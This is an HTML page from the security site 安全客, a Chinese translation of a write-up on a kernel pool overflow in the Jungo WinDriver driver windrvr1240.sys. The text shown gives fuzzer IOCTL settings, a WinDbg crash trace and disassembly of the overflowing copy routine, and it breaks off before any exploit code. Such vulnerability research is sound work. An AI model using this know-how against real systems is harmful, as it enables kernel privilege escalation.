@@ -1,0 +1,826 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】池中之鲨：Windows内核池混合对象利用 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="Windows,内核"/>
+    
+        <meta name="description" content="本文主要探讨一个基本的内核池溢出漏洞，并研究在通过混合内核对象进行内核池喷射后，如何通过覆盖TypeIndex来进行渗透的方法。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】池中之鲨：Windows内核池混合对象利用</h2>
+                <div class="article-msg">
+                    <span class="time">2017-09-19 10:09:18</span>
+                    
+                                        <span class="read">阅读：311次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_4434"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="4434" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://srcincite.io/blog/2017/09/06/sharks-in-the-pool-mixed-object-exploitation-in-the-windows-kernel-pool.html"
+                             target="_blank">来源： srcincite.io</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2857535356" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t00df551a583a87f4e9.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2857535356" style="color:#848e99;">eridanus96</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 2em;"><img src="http://p8.qhimg.com/t01d201e325d727d24d.jpg" title="t01aecf14828912e836.jpg" alt="http://p2.qhimg.com/t01aecf14828912e836.jpg"/><br/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">译者：</span><a href="http://bobao.360.cn/member/contribute?uid=2857535356" target="_self" style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-decoration: underline;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">eridanus96</span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：200RMB</span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="color: rgb(0, 112, 192); font-weight: 900; font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><strong>传送门</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"></span></p><hr/><p style="text-indent: 2em;"><a href="http://bobao.360.cn/learning/detail/3921.html" target="_self" style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 112, 192); text-decoration: underline;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; color: rgb(0, 112, 192);">【技术分享】Windows内核池喷射</span></strong></a></p><p style="text-indent: 2em;"><a href="http://bobao.360.cn/learning/detail/3544.html" target="_self" style="color: rgb(0, 112, 192); text-decoration: underline;"><span style="color: rgb(0, 112, 192);"><strong><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">【技术分享】HEVD内核漏洞训练——陪Windows玩儿</span></strong></span></a></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">前言</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">本文主要探讨一个基本的内核池溢出漏洞，并研究在通过混合内核对象进行内核池喷射后，如何通过覆盖TypeIndex来进行渗透的方法。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">此前，我参加了<a href="http://www.fuzzysecurity.com/tutorials.html" target="_self">AWE系列课程</a>，在课程结束后，我很想找到一些可以利用的内核漏洞。尽管我可以使用<a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_self">HackSys Extreme Vulnerable Driver（HEVD）</a>这个非常棒的学习工具，但我认为，在实际应用中发现并利用漏洞，会让我更有成就感。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">于是，我开始学习如何开发一个Windows内核设备驱动程序的fuzzer，并使用我自己的fuzzer去发现漏洞，这个漏洞就是我借助自己的fuzzer发现的。希望我的漏洞发现和利用过程能对大家有所帮助。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">&nbsp;</span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">漏洞分析</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在测试了一些SCADA（数据采集与监视控制系统）产品后，我发现了一个叫做“WinDriver”的第三方组件，它其实是<a href="http://www.jungo.com/st/products/windriver/" target="_self">Jungo的DriverWizard WinDriver</a>，该组件通常捆绑于几个SCADA应用程序之中，经常能在旧版本中发现它的踪迹。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在安装之后，它将一个名为<strong>windrvr1240.sys</strong>的设备驱动程序安装到Windows的驱动文件夹内。通过逆向，我找到了几个ioctl代码，可以直接插入到我fuzzer的配置文件中。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">{&nbsp;
+&nbsp;&nbsp;&nbsp;&nbsp;&quot;ioctls_range&quot;:{
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;start&quot;:&nbsp;&quot;0x95380000&quot;,
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;end&quot;:&nbsp;&quot;0x9538ffff&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;}
+}</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后，我通过使用<strong>verifier/volatile/flags 0x1/adddriver windrvr1240.sys</strong>，启用了一个特殊的池，并初步尝试运行了我的fuzzer。随后，成功发现了几个可以利用的漏洞，其中一个漏洞引起了我的注意：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">kd&gt;&nbsp;.trap&nbsp;0xffffffffc800f96c
+ErrCode&nbsp;=&nbsp;00000002
+eax=e4e4e4e4&nbsp;ebx=8df44ba8&nbsp;ecx=8df45004&nbsp;edx=805d2141&nbsp;esi=f268d599&nbsp;edi=00000088
+eip=9ffbc9e5&nbsp;esp=c800f9e0&nbsp;ebp=c800f9ec&nbsp;iopl=0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;nv&nbsp;up&nbsp;ei&nbsp;pl&nbsp;nz&nbsp;na&nbsp;pe&nbsp;cy
+cs=0008&nbsp;&nbsp;ss=0010&nbsp;&nbsp;ds=0023&nbsp;&nbsp;es=0023&nbsp;&nbsp;fs=0030&nbsp;&nbsp;gs=0000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;efl=00010207
+windrvr1240+0x199e5:
+9ffbc9e5&nbsp;8941fc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[ecx-4],eax&nbsp;ds:0023:8df45000=????????
+&nbsp;
+kd&gt;&nbsp;dd&nbsp;esi+ecx-4
+805d2599&nbsp;&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4
+805d25a9&nbsp;&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4
+805d25b9&nbsp;&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4
+805d25c9&nbsp;&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4
+805d25d9&nbsp;&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4
+805d25e9&nbsp;&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4
+805d25f9&nbsp;&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4
+805d2609&nbsp;&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4&nbsp;e4e4e4e4</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这是存储在[esi + ecx]中的用户控制数据，而它会对超出内核池的部分进行写入，通过进一步的研究发现，这其实是由loc_4199D8中的内联赋值操作而导致的池溢出。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:bash;toolbar:false">.text:0041998E&nbsp;sub_41998E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;proc&nbsp;near&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;CODE&nbsp;XREF:&nbsp;sub_419B7C+3B2
+.text:0041998E
+.text:0041998E&nbsp;arg_0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;dword&nbsp;ptr&nbsp;&nbsp;8
+.text:0041998E&nbsp;arg_4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;dword&nbsp;ptr&nbsp;&nbsp;0Ch
+.text:0041998E
+.text:0041998E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebp
+.text:0041998F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebp,&nbsp;esp
+.text:00419991&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx
+.text:00419992&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ebx,&nbsp;[ebp+arg_4]
+.text:00419995&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;esi
+.text:00419996&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi
+.text:00419997&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;458h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;fized&nbsp;size_t&nbsp;+0x8&nbsp;==&nbsp;0x460
+.text:0041999C&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edi,&nbsp;edi
+.text:0041999E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;edi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;int
+.text:0041999F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;&nbsp;&nbsp;&nbsp;ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;void&nbsp;*
+.text:004199A0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;memset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;memset&nbsp;our&nbsp;buffer&nbsp;before&nbsp;the&nbsp;overflow
+.text:004199A5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,&nbsp;[ebp+arg_0]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;this&nbsp;is&nbsp;the&nbsp;SystemBuffer
+.text:004199A8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;esp,&nbsp;0Ch
+.text:004199AB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edx]
+.text:004199AD&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebx],&nbsp;eax
+.text:004199AF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edx+4]
+.text:004199B2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebx+4],&nbsp;eax
+.text:004199B5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edx+8]
+.text:004199B8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebx+8],&nbsp;eax
+.text:004199BB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edx+10h]
+.text:004199BE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebx+10h],&nbsp;eax
+.text:004199C1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edx+14h]
+.text:004199C4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebx+14h],&nbsp;eax
+.text:004199C7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eax,&nbsp;[edx+18h]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;read&nbsp;our&nbsp;controlled&nbsp;size&nbsp;from&nbsp;SystemBuffer
+.text:004199CA&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[ebx+18h],&nbsp;eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;;&nbsp;store&nbsp;it&nbsp;in&nbsp;the&nbsp;new&nbsp;kernel&nbsp;buffer
